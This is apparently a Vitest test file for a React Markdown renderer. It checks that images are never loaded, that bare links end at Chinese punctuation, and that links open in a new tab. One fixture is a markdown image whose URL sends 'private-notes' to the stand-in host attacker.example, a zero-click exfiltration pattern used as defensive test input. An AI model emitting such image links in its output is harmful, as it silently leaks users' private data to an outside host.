import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { Markdown } from "./markdown";

describe("Markdown", () => {
  it("never loads an image, since the browser would send its URL with no click", () => {
    const html = renderToStaticMarkup(
      <Markdown text="Look: ![a chart](https://attacker.example/?data=private-notes)" />,
    );
    expect(html).not.toContain("<img");
    expect(html).not.toContain("attacker.example");
    expect(html).toContain("[image: a chart]");
  });

  it("doesn't load a raw HTML image either", () => {
    const html = renderToStaticMarkup(<Markdown text={'<img src="https://attacker.example/x">'} />);
    expect(html).not.toContain("<img");
  });

  it("ends a bare link at Chinese punctuation, instead of running on into the sentence", () => {
    const html = renderToStaticMarkup(
      <Markdown text="来源：https://a.example/2026-11-07（仅摘要，站点403）；Stack Overflow" />,
    );
    expect(html).toContain('href="https://a.example/2026-11-07"');
    expect(html).toContain(">https://a.example/2026-11-07</a>（仅摘要，站点403）；Stack Overflow");
  });

  it("leaves a written link as it is, and Chinese letters in a bare link", () => {
    const written = renderToStaticMarkup(<Markdown text="[来源（一）](https://a.example/x)" />);
    expect(written).toContain('href="https://a.example/x"');
    expect(written).toContain(">来源（一）</a>");
    const bare = renderToStaticMarkup(
      <Markdown text="https://zh.wikipedia.org/wiki/分支预测 ok" />,
    );
    expect(bare).toContain("/wiki/%E5%88%86%E6%94%AF%E9%A2%84%E6%B5%8B");
  });

  it("keeps links, opening them separately, since they need a click", () => {
    const html = renderToStaticMarkup(<Markdown text="[a source](https://a.example/)" />);
    expect(html).toContain('href="https://a.example/"');
    expect(html).toContain('target="_blank"');
  });
});
